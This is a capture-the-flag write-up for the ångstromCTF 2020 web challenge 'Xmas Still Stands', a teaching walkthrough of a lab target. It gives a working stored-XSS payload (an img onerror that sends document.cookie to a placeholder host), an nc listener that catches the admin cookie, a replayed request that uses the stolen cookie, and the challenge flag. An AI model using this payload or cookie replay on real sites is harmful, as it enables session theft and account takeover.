# ångstromCTF 2020 – Xmas Still Stands

* **Category:** web
* **Points:** 50

## Challenge

> You remember when I said I dropped clam's tables? Well that was on Xmas day. And because I ruined his Xmas, he created the Anti Xmas Warriors to try to ruin everybody's Xmas. Despite his best efforts, Xmas Still Stands. But, he did manage to get a flag and put it on his site. Can you get it?
> 
> Author: aplet123
> 
> https://xmas.2020.chall.actf.co/

## Solution

The title reminds the XSS vulnerability.

The `https://xmas.2020.chall.actf.co/post` page can be used to post a message with an XSS attack. For example using an `img` tag like the following.

```html
<img src="foo.png" onerror="document.location='http://x.x.x.x:1337?c='+document.cookie;" />
```

The website will return a code that can be used to identify the posted message.

The resulting code can be sent to administrator via `https://xmas.2020.chall.actf.co/report` page.

On a server listening with `nc`, you will receive the admin cookies.

```
ubuntu@server:~$ nc -lvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
Connection from ec2-52-207-14-64.compute-1.amazonaws.com 48884 received!
GET /?c=super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie HTTP/1.1
Host: x.x.x.x:1337
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Jamie's browser
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://127.0.0.1:3000/posts/642
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Then the cookie can be used to perform a request to `https://xmas.2020.chall.actf.co/admin` page.

```
GET /admin HTTP/1.1
Host: xmas.2020.chall.actf.co
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: super_secret_admin_cookie=hello_yes_i_am_admin;%20admin_name=Jamie
Referer: https://xmas.2020.chall.actf.co/admin
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Content-Length: 2905
Content-Type: text/html; charset=utf-8
Date: Mon, 16 Mar 2020 00:07:35 GMT
Etag: W/"b59-k/yKe0HiO0ZF+89xBSA/dXuyjnQ"
Server: Caddy
Server: nginx/1.14.1
X-Powered-By: Express
Connection: close

<!doctype html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    
        <link rel="stylesheet" href="/bootstrap.css">
        <link rel="stylesheet" href="/style.css">
    
        <title>Anti-Xmas Warriors</title>
    
        <script defer src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
        <script defer src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
        <script defer src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
    </head>
    <body>
        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">
            <a class="navbar-brand" href="/">Anti-Xmas Warriors</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
            
            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav mr-auto">
                    <li class="nav-item">
                        <a class="nav-link" href="/">Home</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/post">Post</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/report">Report</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" href="/admin">Admin</a>
                    </li>
                </ul>
            </div>
        </nav>        <div class="container mx-auto text-center partial-width pt-2">
    <h1 class="display-4">Admin Landing Page</h1>
    <p>Hey admins, you may have noticed that we've changed things up a bit. There's no longer any cumbersome, bruteforceable login system. All you need is the secret cookie verifying that you're an admin and you can get the flag anytime you want. Also, if you're not an admin PLEASE LEAVE THIS PAGE YOU DON'T BELONG HERE AND I WILL HUNT YOU DOWN AND RUIN YOUR DAY IF YOU STAY HERE. Disclaimer: I will not actually hunt you down or physically hurt you in any way, shape, or form, please don't sue me thanks.</p>
        <p>Oh hey admin! The flag is actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}.</p>
</div>
    </body>
</html>
```

The flag is the following.

```
actf{s4n1tize_y0ur_html_4nd_y0ur_h4nds}
```